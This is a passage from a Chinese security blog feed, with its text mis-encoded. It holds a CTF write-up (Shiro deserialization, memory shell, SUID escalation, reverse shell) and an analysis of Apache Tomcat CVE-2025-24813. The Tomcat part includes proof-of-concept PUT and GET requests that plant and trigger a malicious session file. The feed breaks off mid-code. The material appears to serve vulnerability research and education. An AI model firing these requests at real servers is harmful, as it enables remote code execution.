id="è¡¥ä¸ä¿®å¤"><a href="#è¡¥ä¸ä¿®å¤" class="headerlink" title="è¡¥ä¸ä¿®å¤"></a>è¡¥ä¸ä¿®å¤</h1><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/d9f9acaccacf546c2bcc2d671063deb9.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç»™è·å–åˆ°çš„è·¯å¾„ä¹Ÿç”¨äº†è·¯ç”±åŒ¹é…æ—¶çš„<code>stripMatrixParams</code>æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œä½¿ç‚¹å·æ— æ‰€éå½¢ï¼Œä¹Ÿå°±æ²¡æ³•æ„é€ ä¸ºæ»¡è¶³æ¡ä»¶çš„è·¯å¾„äº†</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>åˆ†æå®Œå‘ç°è¿™ä¸ªæ¼æ´è¿˜æ˜¯æœ‰ç‚¹é¸¡è‚‹ï¼Œéœ€è¦æ²¡æœ‰<code>/</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªèƒ½åƒ<code>/aaa</code>è¿™æ ·çš„è·¯ç”±æ‰èƒ½ç»•è¿‡è®¤è¯ï¼Œè€Œ <code>/api/aaa</code>è¿™ç§å°±æ²¡æ³•ç»•è¿‡ï¼ˆéš¾é“æ˜¯æœ‰å¯ä»¥æ„é€ çš„æ–¹å¼å—ï¼‰ã€‚è€Œä¸”è¿™ä¸ªæ·»åŠ ç”¨æˆ·åï¼Œç”¨æˆ·æœ‰å“ªäº›æƒé™å‘¢ï¼Ÿå› ä¸ºå¯¹è¿™æ¬¾äº§å“äº†è§£ä¸å¤šï¼Œç¡®å®æ²¡çœ‹å‡ºæ¥æ–°å¢çš„ç”¨æˆ·èƒ½å¹²å˜›ï¼ˆå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥è§£ç­”ï¼‰ã€‚ä¸è¿‡è‡³å°‘è·å–æ•æ„Ÿä¿¡æ¯è¿˜æ˜¯å¯ä»¥åšåˆ°çš„</p><p><img src="https://cdn.jsdelivr.net/gh/ph0ebus/picture-bed@main/2025/04/08/29c14608bfb046e1c11589b9a089ae03.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> pinot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-é•¿åŸæ¯åŠå†³èµ›ISWéƒ¨åˆ†Writeup</title>
      <link href="/2025/03/25/CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BISW%E9%83%A8%E5%88%86Writeup/"/>
      <url>/2025/03/25/CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BISW%E9%83%A8%E5%88%86Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®ç®¡ç†"><a href="#æ•°æ®ç®¡ç†" class="headerlink" title="æ•°æ®ç®¡ç†"></a>æ•°æ®ç®¡ç†</h1><p>çŒœæµ‹æ˜¯ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://s2.loli.net/2025/03/25/YnFzZyGiAh9O5RE.png" alt="image-20250316141246133"></p><p>é€šè¿‡è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineå¯ä»¥å®šä½åˆ°jaråŒ…ï¼Œä¸‹è½½åæ‰¾åˆ°shirokey</p><p><img src="https://s2.loli.net/2025/03/25/iKuweLVAsndJhQo.png" alt="image-20250316141311170"></p><p>ç›´æ¥æ‰“shiroååºåˆ—åŒ–</p><p><img src="https://s2.loli.net/2025/03/25/aQGbYqoMBLTArKs.png" alt="image-20250316141329853"></p><p>æ³¨å…¥å†…å­˜é©¬</p><p><img src="https://s2.loli.net/2025/03/25/F5PlT2LKGbtCfd4.png" alt="image-20250316141345139"></p><p>å†™å…¥.sshå…¬é’¥</p><p><img src="https://s2.loli.net/2025/03/25/SnpKB6IDhxEgyGA.png" alt="image-20250316141404115"></p><p>ç™»å½•ï¼Œsuidææƒ</p><p><img src="https://s2.loli.net/2025/03/25/ixSY4mns9DENwI7.png" alt="image-20250316141425856"></p><h1 id="web-git"><a href="#web-git" class="headerlink" title="web-git"></a>web-git</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>å­˜åœ¨ç›®å½•éå†ï¼Œå¯ä»¥æ‰¾åˆ°é¢„ç•™åé—¨</p><p><img src="https://s2.loli.net/2025/03/25/XbRwB1iTq9DufZC.png" alt="image-20250316142821864"></p><p><img src="https://s2.loli.net/2025/03/25/lSXtad6EoI2GZVi.png" alt="image-20250316142758195"></p><p>æ¢å¤gitè®°å½•</p><p><img src="https://s2.loli.net/2025/03/25/3SFMgpOvYomZP1G.png" alt="6770903bec5838003c6749bd_1742115677231"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>æŸ¥çœ‹æ–‡ä»¶æƒé™å‘ç°&#x2F;home&#x2F;ryanä¸‹del.pyå¯å†™ï¼ŒçŒœæµ‹æ˜¯å®šæ—¶æ‰§è¡Œï¼Œç›´æ¥åå¼¹shell</p><p><img src="https://s2.loli.net/2025/03/25/LuBdGcWtxPeSCqm.png" alt="image-20250316154059221"></p><p><img src="https://s2.loli.net/2025/03/25/irOeT8hJUVm7ZbG.png" alt="image-20250316154125428"></p><p><img src="https://s2.loli.net/2025/03/25/tibXOEsymekVD9I.png" alt="image-20250316154242843"></p><p>sshé»˜è®¤æœªå¯åŠ¨éœ€è¦æ‰‹åŠ¨å¼€å¯</p><p><img src="https://s2.loli.net/2025/03/25/TRYkmjLdgya3AQ2.png" alt="image-20250316154305860"></p><p>ä¿®æ”¹rootå¯†ç ç›´æ¥sshè¿ä¸Š</p><p><img src="https://s2.loli.net/2025/03/25/UFvBmYcs6TDakSp.png" alt="image-20250316154350159"></p><p><img src="https://s2.loli.net/2025/03/25/prUD9FNKfXjhHid.png" alt="image-20250316154413412"></p><p>æŸ¥çœ‹aim.jpgç„¶åäººå·¥OCRä¸€ä¸‹å¾—åˆ°flag</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>åœ¨&#x2F;home&#x2F;gitlabå¯ä»¥æ‰¾åˆ°å¯ç–‘æ–‡ä»¶lookmeï¼Œå‘ç°flag</p><p><img src="https://s2.loli.net/2025/03/25/914ARSeIWubG2Yc.png" alt="6770903bec5838003c6749bd_1742116134975"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>æŸ¥çœ‹mailå¯ä»¥æ‰¾åˆ°flagï¼Œè§£base64å³å¯</p><p><img src="https://s2.loli.net/2025/03/25/AY5cIUt7v4MXnSu.png" alt="image-20250316160851215"></p><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>ç›´æ¥æŠ“å–å¯¹åº”ç½‘å¡eth1çš„æµé‡ï¼Œç­‰å¾…äº”åˆ†é’Ÿåçš„ç»“æœï¼Œä¸‹è½½ä¸‹æ¥ç„¶åç”¨wiresharkåˆ†æ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tcpdump -i eth1 -w output.pcap</span><br></pre></td></tr></table></figure><p>Wiresharkå›¾ç‰‡</p><p>æ‰¾åˆ°<code>192.168.57.203:4948</code>ï¼Œmd5å¾—åˆ°<code>59110f555b5e5cd0a8713a447b082d63</code>ï¼ŒåŒ…ä¸Šflagæäº¤</p><p><img src="https://s2.loli.net/2025/03/25/MtEm69pgnal7kTz.png" alt="6741506cdf031d003c586ad8_1742115244313"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Tomcat CVE-2025-24813 æ¼æ´åˆ†æå¤ç°</title>
      <link href="/2025/03/11/Apache%20Tomcat%20CVE-2025-24813%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/11/Apache%20Tomcat%20CVE-2025-24813%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Apache Tomcatæ˜¯ä¸€ä¸ªæµè¡Œçš„å¼€æº Web æœåŠ¡å™¨å’Œ Java Servlet å®¹å™¨ã€‚</p><p>Apache Tomcat åº”ç”¨ç¨‹åºåœ¨å¯ç”¨äº†servletçš„å†™å…¥åŠŸèƒ½ï¼ˆé»˜è®¤ç¦ç”¨ï¼‰ã€ä½¿ç”¨Tomcatæ–‡ä»¶ä¼šè¯æŒä¹…åŒ–ã€å­˜å‚¨æœºåˆ¶é»˜è®¤ä½ç½®ä¸”åŒ…å«å¯ååºåˆ—åŒ–åˆ©ç”¨çš„ä¾èµ–åº“æ—¶å¯ä»¥ä¸Šä¼ æ¶æ„åºåˆ—åŒ–æµï¼Œå¹¶è§¦å‘ååºåˆ—åŒ–è¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œç­‰å±å®³ã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</p><p>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</p><p>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¿®æ”¹ tomcat å®‰è£…ç›®å½•ä¸­ conf&#x2F;web.xml æ–‡ä»¶ï¼Œè®¾ç½® readonly ä¸º false</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- å¯ç”¨å†™å…¥ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ tomcat å®‰è£…ç›®å½•ä¸­ conf&#x2F;context.xml æ–‡ä»¶ï¼Œå¯ç”¨ session æ–‡ä»¶æŒä¹…åŒ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯ç”¨ä¼šè¯æŒä¹…åŒ– --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åéœ€è¦æ‰‹åŠ¨å¼•å…¥ä¸€ä¸ªæœ‰ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ–ï¼Œæˆ‘è¿™é‡Œé€‰ç”¨äº† common-collections:3.2.1</p><p><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p><p>ä¸‹è½½ jar åŒ…åæ”¾å…¥ tomcat å®‰è£…ç›®å½•ä¸‹çš„ lib ç›®å½•å³å¯ã€‚</p><p>ç„¶åå¯åŠ¨ Tomcat æ—¶ä½¿ç”¨ bin&#x2F;catalina.bat çš„ jpda å¯åŠ¨</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.bat jpda <span class="built_in">start</span></span><br></pre></td></tr></table></figure><p>tomcat é»˜è®¤è°ƒè¯•çš„ç«¯å£æ˜¯ 8000</p><p>é…ç½®è°ƒè¯•ï¼Œæ³¨æ„ç«¯å£</p><p><img src="https://s2.loli.net/2025/03/25/y16g9Bn8teMZQP3.png" alt="img"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>å†™å…¥æ¶æ„åºåˆ—åŒ–æµæ•°æ®ï¼Œæ³¨æ„è¿™é‡Œçš„ Content-Range æ•°å€¼ï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/poc.session</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1909/1910</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">F:</span>\CTFtools\java-chains-1.4.0-all\JavaNativePayload_CommonsCollectionsK1_TemplatesImpl_BytecodeConvert_Exec.txt)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure><p>ç„¶ååŠ è½½ session æ–‡ä»¶è§¦å‘ååºåˆ—åŒ–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.poc</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/03/25/2c4fDOeImaiLKbF.png" alt="img"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>é¦–å…ˆçœ‹æ¼æ´é€šå‘Š</p><p><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></p><blockquote><p>If all of the following were true, a malicious user was able to perform remote code execution:</p><ul><li><p>writes enabled for the default servlet (disabled by default)</p></li><li><p>support for partial PUT (enabled by default)</p></li><li><p>application was using Tomcatâ€™s file based session persistence with the default storage location</p></li><li><p>application included a library that may be leveraged in a deserialization attack</p></li></ul></blockquote><p>çœ‹åˆ°è¿™å‡ ä¸ªæ¡ä»¶å¯ä»¥åˆ†æå‡ºä»¥ä¸‹å†…å®¹</p><ul><li>å¯ä»¥å†™å…¥ä»»æ„å†…å®¹</li><li>å’Œ session æ–‡ä»¶æŒä¹…åŒ–æœ‰å…³</li><li>å’Œååºåˆ—åŒ–æœ‰å…³</li></ul><p>çœ‹å®Œå¾ˆå®¹æ˜“è”æƒ³åˆ° PHP ä¸­çš„ SESSION ååºåˆ—åŒ–ã€‚</p><p>é€šè¿‡æ§åˆ¶ session æ–‡ä»¶å†…å®¹ï¼Œå†™å…¥æ¶æ„åºåˆ—åŒ–æµï¼Œåœ¨åŠ è½½ session æ–‡ä»¶å†…å®¹æ—¶è§¦å‘ååºåˆ—åŒ–</p><p>é‚£ä¹ˆæœ‰å‡ ä¸ªç–‘é—®ç‚¹ï¼š</p><ul><li>session æ–‡ä»¶å­˜æ”¾åœ¨å“ªï¼Ÿ</li><li>æ€ä¹ˆå¤„ç† session æ–‡ä»¶çš„ï¼ŒçœŸçš„æ˜¯æ™®é€šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å—</li><li>PUT é»˜è®¤å†™å…¥åœ¨ Web ç›®å½•ï¼Œæ€ä¹ˆå†™å…¥åˆ° session æ–‡ä»¶å­˜å‚¨çš„ä½ç½®</li></ul><p>ä¸€ä¸ªä¸€ä¸ªè§£å†³å®ƒ</p><h2 id="session-æ–‡ä»¶å­˜æ”¾åœ¨å“ª"><a href="#session-æ–‡ä»¶å­˜æ”¾åœ¨å“ª" class="headerlink" title="session æ–‡ä»¶å­˜æ”¾åœ¨å“ª"></a>session æ–‡ä»¶å­˜æ”¾åœ¨å“ª</h2><p>æ¼æ´é€šå‘Šä¹Ÿå†™çš„å¾ˆæ˜ç™½ï¼Œéœ€è¦é»˜è®¤ä½ç½®æ‰èƒ½åˆ©ç”¨ï¼Œå°è¯•é—® ai å¯ä»¥å¾—åˆ°ç»“è®º</p><p><img src="https://s2.loli.net/2025/03/25/LlJaWIRNKBXbqhf.png" alt="img"></p><p>è¿™é‡Œè¢«ä»–å°è¿·æƒ‘äº†ä¸€æ‰‹ï¼Œæµ‹è¯•å‘ç°æ–‡ä»¶åå¹¶éå¦‚æ­¤ï¼Œè€Œæ˜¯ <code>&#123;JSESSIONID&#125;.session</code>ï¼Œè·¯å¾„æ˜¯æ²¡é—®é¢˜çš„</p><p>éœ€è¦æµ‹è¯•å¯ä»¥è®¿é—® &#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample æ¥è·å– sessionï¼Œç„¶åå…³é—­ tomcat æœåŠ¡å™¨ï¼Œå…³é—­æ—¶ tomcat ä¼šè‡ªåŠ¨è°ƒç”¨ session æ–‡ä»¶æŒä¹…åŒ–ï¼Œä½¿ session æŒä¹…åŒ–ä¿å­˜</p><p><img src="https://s2.loli.net/2025/03/25/uqySkUfTjNh72cX.png" alt="img"></p><p><img src="https://s2.loli.net/2025/03/25/OHKmAQUvd2VyNMI.png" alt="img"></p><h2 id="æ€ä¹ˆå¤„ç†-session-æ–‡ä»¶çš„ï¼ŒçœŸçš„æ˜¯æ™®é€šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å—"><a href="#æ€ä¹ˆå¤„ç†-session-æ–‡ä»¶çš„ï¼ŒçœŸçš„æ˜¯æ™®é€šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å—" class="headerlink" title="æ€ä¹ˆå¤„ç† session æ–‡ä»¶çš„ï¼ŒçœŸçš„æ˜¯æ™®é€šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å—"></a>æ€ä¹ˆå¤„ç† session æ–‡ä»¶çš„ï¼ŒçœŸçš„æ˜¯æ™®é€šåºåˆ—åŒ–å’Œååºåˆ—åŒ–å—</h2><p>å¯ä»¥ç”¨ 010 æ‰“å¼€å¾—åˆ°çš„ session æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°é­”æ•°ä¸º 0xAC 0xED ç¬¦åˆåºåˆ—åŒ–æµçš„ç‰¹å¾ï¼Œä¹Ÿè¿›ä¸€æ­¥éªŒè¯äº†çŒœæƒ³ï¼Œä½†è¿˜éœ€è¿›ä¸€æ­¥è°ƒè¯•æºç éªŒè¯</p><p>é¦–å…ˆå®šä½åˆ°è¿™éƒ¨åˆ†é€»è¾‘çš„ä»£ç ï¼Œä¹Ÿå¯ä»¥å’¨è¯¢ ai</p><p><img src="https://s2.loli.net/2025/03/25/w9kjbFGNPVptmdi.png" alt="img"></p><p>æ ¹æ®ç±»åå°±èƒ½çŒœåˆ°åº”è¯¥æ˜¯<code>org.apache.catalina.session.FileStore</code>ï¼Œå®šä½ç›¸å…³ä»£ç </p><p>è·Ÿè¿›<code>org.apache.catalina.session.FileStore#save</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(Session session)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(session.getIdInternal());</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.manager.getContext().getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manager.getContext().getLogger().debug(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.saving&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;session.getIdInternal(), file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((StandardSession)session).writeObjectData(oos);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    oos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">                    var9.addSuppressed(var8);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var9;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                var10.addSuppressed(var7);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var10;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œå°† session åºåˆ—åŒ–åå­˜å‚¨åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚</p><p>è·Ÿè¿›<code>org.apache.catalina.session.FileStore#file()</code> å¯ä»¥æ‰¾åˆ° session æ–‡ä»¶çš„å‘½åè§„åˆ™ï¼Œå°±æ˜¯ sessionid åŠ ä¸Š <code>.session</code> åç¼€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">file</span><span class="params">(String id)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">storageDir</span> <span class="operator">=</span> <span class="built_in">this</span>.directory();</span><br><span class="line">    <span class="keyword">if</span> (storageDir == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> id + <span class="string">&quot;.session&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(storageDir, filename);</span><br><span class="line">        <span class="type">File</span> <span class="variable">canonicalFile</span> <span class="operator">=</span> file.getCanonicalFile();</span><br><span class="line">        <span class="keyword">if</span> (!canonicalFile.toPath().startsWith(storageDir.getCanonicalFile().toPath())) &#123;</span><br><span class="line">            log.warn(sm.getString(<span class="string">&quot;fileStore.invalid&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;file.getPath(), id&#125;));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> canonicalFile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>org.apache.catalina.session.FileStore#directory()</code>å¯ä»¥æ‰¾åˆ°è·å–å­˜å‚¨ç›®å½•è·¯å¾„çš„é€»è¾‘</p><p><img src="https://s2.loli.net/2025/03/25/Jsj2ZlHWznc7otA.png" alt="img"></p><p>ä¹Ÿå°±æ˜¯ä»<code>javax.servlet.context.tempdir</code>ä¸­è·å–ï¼Œè¿™ä¸ªå€¼å’Œä¸Šä¸‹æ–‡æœ‰å…³ã€‚</p><p>æ—¢ç„¶æœ‰æŒä¹…åŒ–å­˜å‚¨ session çš„é€»è¾‘ï¼Œç»§ç»­æ‰¾æ‰¾åŠ è½½ session çš„é€»è¾‘</p><p>è·Ÿè¿›<code>org.apache.catalina.session.FileStore#load</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Session <span class="title function_">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(id);</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span 